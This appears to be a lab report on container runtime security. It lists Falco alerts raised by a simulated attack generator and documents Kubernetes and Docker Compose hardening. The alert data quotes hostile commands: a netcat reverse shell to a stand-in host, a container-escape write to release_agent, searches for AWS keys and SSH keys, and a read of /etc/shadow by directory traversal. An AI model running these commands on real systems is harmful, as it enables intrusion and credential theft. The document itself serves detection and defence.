## Task 1

### Critical Detections

- **Critical:** Detect an attempt to exploit a container escape using release_agent file
    - file = `/release_agent`
    - evt_type = `open`
    - user = `root`
        - user_uid = `0`
        - user_loginuid = `-1`
    - process = `sh`
        - proc_exepath = `/bin/busybox`
        - parent = `event-generator`
        - command = `sh -c echo 'hello world' > release_agent`
        - terminal = `0`
    - container_id = `abc6831a04ae`
        - container_name = `eventgen`
        - container_image_repository = `falcosecurity/event-generator`
        - container_image_tag = `latest`
- **Critical:** Executing binary not part of base image
    - proc_exe = `/bin/falco-event-generator-syscall-DropAndExecuteNewBinaryInContainer-pIekP8`
    - proc_sname = `event-generator`
    - gparent = `containerd-shim`
    - proc_exe_ino_ctime = `1763120565795851894`
    - proc_exe_ino_mtime = `1763120565795851894`
    - proc_exe_ino_ctime_duration_proc_start = `15867197`
    - proc_cwd = `/`
    - container_start_ts = `1763120552324820709`
    - evt_type = `execve`
    - user = `root`
        - user_uid = `0`
        - user_loginuid = `-1`
    - process = `falco-event-gen`
        - proc_exepath = `/bin/falco-event-generator-syscall-DropAndExecuteNewBinaryInContainer-pIekP8`
        - parent = `event-generator`
        - command = `falco-event-gen`
        - terminal = `0`
        - exe_flags = `EXE_WRITABLE | EXE_UPPER_LAYER`
    - container_id = `abc6831a04ae`
        - container_name = `eventgen`
        - container_image_repository = `falcosecurity/event-generator`
        - container_image_tag = `latest`
- **Critical:** Fileless execution via memfd_create
    - container_start_ts = `1763120552324820709`
    - proc_cwd = `/`
    - evt_res = `SUCCESS`
    - proc_sname = `event-generator`
    - gparent = `containerd-shim`
    - evt_type = `execve`
    - user = `root`
        - user_uid = `0`
        - user_loginuid = `-1`
    - process = `3`
        - proc_exepath = `memfd:program`
        - parent = `event-generator`
        - command = `3 run helper.DoNothing`
        - terminal = `0`
        - exe_flags = `EXE_WRITABLE | EXE_FROM_MEMFD`
    - container_id = `abc6831a04ae`
        - container_name = `eventgen`
        - container_image_repository = `falcosecurity/event-generator`
        - container_image_tag = `latest`


### Warning Detections

- **Warning:** Falco Custom: File write in /usr/local/bin
	- container = `lab9-helper`
	- user = `root`
	- file = `/usr/local/bin/custom-rule.txt`
	- flags = `O_LARGEFILE | O_TRUNC | O_CREAT | O_WRONLY | O_F_CREATED | FD_UPPER_LAYER`
	- container_id = `a12356e689e8`
		- container_name = `lab9-helper`
		- container_image_repository=`alpine`
		- container_image_tag = `3.19`
- **Warning:** Netcat runs inside container that allows remote code execution
- evt_type = `execve`
- user = `root`
	- user_uid = `0`
	- user_loginuid = `-1`
- process = `nc`
	- proc_exepath = `/usr/bin/nc`
	- parent = `event-generator`
	- command = `nc -e /bin/sh example.com 22`
	- terminal = `0`
	- exe_flags = `EXE_WRITABLE | EXE_LOWER_LAYER`
- container_id = `abc6831a04ae`
	- container_name = `eventgen`
	- container_image_repository = `falcosecurity/event-generator`
	- container_image_tag = `latest`
- **Warning:** File execution detected from /dev/shm
	- proc_cwd = `/`
		- proc_pcmdline = `event-generator run syscall`
	- 4group_gid= `0`
	- group_name = `root`
	- evt_type = `execve`
	- user = `root`
		- user_uid = `0`
		- user_loginuid = `-1`
	- process = `sh`
		- proc_exepath= `/bin/busybox`
		- parent = `event-generator`
		- command = `sh -c /dev/shm/falco-event-generator-syscall ExecutionFromDevShm-WlkJ1d.sh`
		- terminal = `0`
		- exe_flags = `EXE_WRITABLE | EXE_LOWER_LAYER`
	- container_id = `abc6831a04ae`
		- container_name=`eventgen`
		- container_image_repository = `falcosecurity/event-generator`
		- container_image_tag = `latest`



- **Warning:** Bulk data has been removed from disk
    - evt_type = `execve`
    - user = `root`
        - user_uid = `0`
        - user_loginuid = `-1`
    - process = `shred`
        - proc_exepath = `/bin/busybox`
        - parent = `event-generator`
        - command = `shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-3702235722`
        - terminal = `0`
        - exe_flags = `EXE_WRITABLE | EXE_LOWER_LAYER`
    - container_id = `abc6831a04ae`
        - container_name = `eventgen`
        - container_image_repository = `falcosecurity/event-generator`
        - container_image_tag = `latest`
- **Warning:** Debugfs launched started in a privileged container
    - evt_type = `execve`
    - user = `root`
        - user_uid = `0`
        - user_loginuid = `-1`
    - process = `debugfs`
        - proc_exepath = `/usr/sbin/debugfs`
        - parent = `event-generator`
        - command = `debugfs -V`
        - terminal = `0`
        - exe_flags = `EXE_WRITABLE | EXE_LOWER_LAYER`
    - container_id = `abc6831a04ae`
        - container_name = `eventgen`
        - container_image_repository = `falcosecurity/event-generator`
        - container_image_tag = `latest`
- **Warning:** Read monitored file via directory traversal
    - file = `/etc/shadow`
    - fileraw = `/etc/../etc/../etc/shadow`
    - evt_type = `openat`
    - user = `root`
        - user_uid = `0`
        - user_loginuid = `-1`
    - process = `event-generator`
        - proc_exepath = `/bin/event-generator`
        - parent = `containerd-shim`
        - command = `event-generator run syscall`
        - terminal = `0`
    - container_id = `abc6831a04ae`
        - container_name = `eventgen`
        - container_image_repository = `falcosecurity/event-generator`
        - container_image_tag = `latest`
- **Warning:** Sensitive file opened for reading by non-trusted program
    - file = `/etc/shadow`
    - evt_type = `openat`
    - user = `root`
        - user_uid = `0`
        - user_loginuid = `-1`
    - process = `event-generator`
        - proc_exepath = `/bin/event-generator`
        - parent = `containerd-shim`
        - command = `event-generator run syscall`
        - terminal = `0`
    - container_id = `abc6831a04ae`
        - container_name = `eventgen`
        - container_image_repository = `falcosecurity/event-generator`
        - container_image_tag = `latest`
- **Warning:** Detected AWS credentials search activity
    - proc_pcmdline = `event-generator run syscall`
    - proc_cwd = `/`
    - group_gid = `0`
    - group_name = `root`
    - evt_type = `execve`
    - user = `root`
        - user_uid = `0`
        - user_loginuid = `-1`
    - process = `find`
        - proc_exepath = `/bin/busybox`
        - parent = `event-generator`
        - command = `find /tmp -maxdepth 1 -iname .aws/credentials`
        - terminal = `0`
        - exe_flags = `EXE_WRITABLE | EXE_LOWER_LAYER`
    - container_id = `abc6831a04ae`
        - container_name = `eventgen`
        - container_image_repository = `falcosecurity/event-generator`
        - container_image_tag = `latest`
- **Warning:** Log files were tampered
    - file = `/tmp/falco-event-generator-syscall-ClearLogActivities-1695056983/syslog`
    - evt_type = `openat`
    - user = `root`
        - user_uid = `0`
        - user_loginuid = `-1`
    - process = `event-generator`
        - proc_exepath = `/bin/event-generator`
        - parent = `containerd-shim`
        - command = `event-generator run syscall`
        - terminal = `0`
    - container_id = `abc6831a04ae`
        - container_name = `eventgen`
        - container_image_repository = `falcosecurity/event-generator`
        - container_image_tag = `latest`
- **Warning:** Detected ptrace PTRACE_ATTACH attempt
    - proc_pcmdline = `containerd-shim -namespace moby -id abc6831a04ae35c33de7587e0c2eb78fcea695685eec4c15a152b998f756774b -address /run/containerd/containerd.sock`
    - evt_type = `ptrace`
    - user = `root`
        - user_uid = `0`
        - user_loginuid = `-1`
    - process = `event-generator`
        - proc_exepath = `/bin/event-generator`
        - parent = `containerd-shim`
        - command = `event-generator run syscall`
        - terminal = `0`
    - container_id = `abc6831a04ae`
        - container_name = `eventgen`
        - container_image_repository = `falcosecurity/event-generator`
        - container_image_tag = `latest`
- **Warning:** Symlinks created over sensitive files
    - target = `/etc`
    - linkpath = `/tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-3008289064/etc_link`
    - evt_type = `symlink`
    - user = `root`
        - user_uid = `0`
        - user_loginuid = `-1`
    - process = `ln`
        - proc_exepath = `/bin/busybox`
        - parent = `event-generator`
        - command = `ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-3008289064/etc_link`
        - terminal = `0`
    - container_id = `abc6831a04ae`
        - container_name = `eventgen`
        - container_image_repository = `falcosecurity/event-generator`
        - container_image_tag = `latest`
- **Warning:** Hardlinks created over sensitive files
    - target = `/etc/shadow`
    - linkpath = `/tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-2692954326/shadow_link`
    - evt_type = `link`
    - user = `root`
        - user_uid = `0`
        - user_loginuid = `-1`
    - process = `ln`
        - proc_exepath = `/bin/busybox`
        - parent = `event-generator`
        - command = `ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-2692954326/shadow_link`
        - terminal = `0`
    - container_id = `abc6831a04ae`
        - container_name = `eventgen`
        - container_image_repository = `falcosecurity/event-generator`
        - container_image_tag = `latest`
- **Warning:** Grep private keys or passwords activities found
    - evt_type = `execve`
    - user = `root`
        - user_uid = `0`
        - user_loginuid = `-1`
    - process = `find`
        - proc_exepath = `/bin/busybox`
        - parent = `event-generator`
        - command = `find /tmp -maxdepth 1 -iname id_rsa`
        - terminal = `0`
        - exe_flags = `EXE_WRITABLE | EXE_LOWER_LAYER`
    - container_id = `abc6831a04ae`
        - container_name = `eventgen`
        - container_image_repository = `falcosecurity/event-generator`
        - container_image_tag = `latest`


### Notice Detections

- **Notice:** Packet socket was created in a container
    - socket_info = `fd=3 domain=17(AF_PACKET) type=3 proto=3`
    - evt_type = `socket`
    - user = `root`
        - user_uid = `0`
        - user_loginuid = `-1`
    - process = `event-generator`
        - proc_exepath = `/bin/event-generator`
        - parent = `containerd-shim`
        - command = `event-generator run syscall`
        - terminal = `0`
    - container_id = `abc6831a04ae`
        - container_name = `eventgen`
        - container_image_repository = `falcosecurity/event-generator`
        - container_image_tag = `latest`
- **Notice:** Detected potential PTRACE_TRACEME anti-debug attempt
    - proc_pcmdline = `event-generator run syscall`
    - evt_type = `ptrace`
    - user = `root`
        - user_uid = `0`
        - user_loginuid = `-1`
    - process = `event-generator`
        - proc_exepath = `/bin/event-generator`
        - parent = `event-generator`
        - command = `event-generator run syscall`
        - terminal = `0`
    - container_id = `abc6831a04ae`
        - container_name = `eventgen`
        - container_image_repository = `falcosecurity/event-generator`
        - container_image_tag = `latest`
- **Notice:** Shell spawned by untrusted binary
    - parent_exe = `/tmp/falco-event-generator-syscall-spawned-3461569440/httpd`
    - parent_exepath = `/bin/event-generator`
    - pcmdline = `httpd --loglevel info run ^helper.RunShell$`
    - gparent = `event-generator`
    - ggparent = `containerd-shim`
    - evt_type = `execve`
    - user = `root`
        - user_uid = `0`
        - user_loginuid = `-1`
    - process = `sh`
        - proc_exepath = `/bin/busybox`
        - parent = `httpd`
        - command = `sh -c ls > /dev/null`
        - terminal = `0`
        - exe_flags = `EXE_WRITABLE | EXE_LOWER_LAYER`
    - container_id = `abc6831a04ae`
        - container_name = `eventgen`
        - container_image_repository = `falcosecurity/event-generator`
        - container_image_tag = `latest`

> What is the purpose of the custom rule? When should it fire?

The custom rule is written to detect any changes in **binaries** of already running containers. In this use case, all required binaries are baked into the container image, and, therefore, most runtime changes are abnormal and indicate an ongoing attack.

The rule should fire whenever a file write attempt under `/usr/local/bin` directory is detected within a container. It shouldn't fire when a file on the host is changed or a container file outside of `/usr/local/bin` is changed. However, there might be false positives from the entrypoint container setup.

## Task 2

> Document policy violations from the unhardened manifest and why each matters for security

**Policy violations**:
- `livenessProbe` is not set properly, violating best practices of available health checks
- `readinessProbe` is not set properly, violating best practices of available readiness checks (whether or not the pod is ready to process requests)
- `resources.limits.cpu`, `resources.limits.memory`, `resources.requests.cpu`, `resources.requests.memory` are not set properly, violating the resource constraints policies and allowing inadequate resource consumption and blocking
- `allowPrivilegeEscalation` is not set properly, thus allowing the processes obtain higher privileges than necessary
- `readOnlyRootFilesystem` is not set properly, potentially allowing changes to the root filesystem
- `runAsNonRoot` is not set properly, potentially allowing the pod to run with `root` privileges, and thus inflating the security risks
- `:latest` tag usage potentially allows unverified or unsupported versions of the dependencies to be used

> Document the specific hardening changes in the hardened manifest that satisfy policies

- Running as non-root set properly:
	- `runAsNonRoot: true`
- Privilege escalation explicitly restricted
	- `allowPrivilegeEscalation: false`
- Root filesystem protected:
	- `readOnlyRootFilesystem: true`
- All capabilities dropped:
	- `capabilities: drop: ["ALL"]`
- Resource constraints set properly:
	- `resources:`
            `requests: { cpu: "100m", memory: "256Mi" }`
            `limits:   { cpu: "500m", memory: "512Mi" }`
- Liveness probe (health check) set properly
	- `readinessProbe:`
            `httpGet: { path: /, port: 3000 }`
            `initialDelaySeconds: 5`
            `periodSeconds: 10`
- Readiness probe (extension of health checks) set properly
	- `livenessProbe:`
            `httpGet: { path: /, port: 3000 }`
            `initialDelaySeconds: 10`
            `periodSeconds: 20`

> Document the analysis of the Docker Compose manifest results

According to the result log, all docker compose checks have passed:
	- `15 tests, 15 passed, 0 warnings, 0 failures, 0 exceptions`

Given the manifesto contents, this means that:
- Explicit non-root user restriction is set
- `read_only: true` is set for services
- All capabilities are dropped
- Services enable `no-new-privileges`


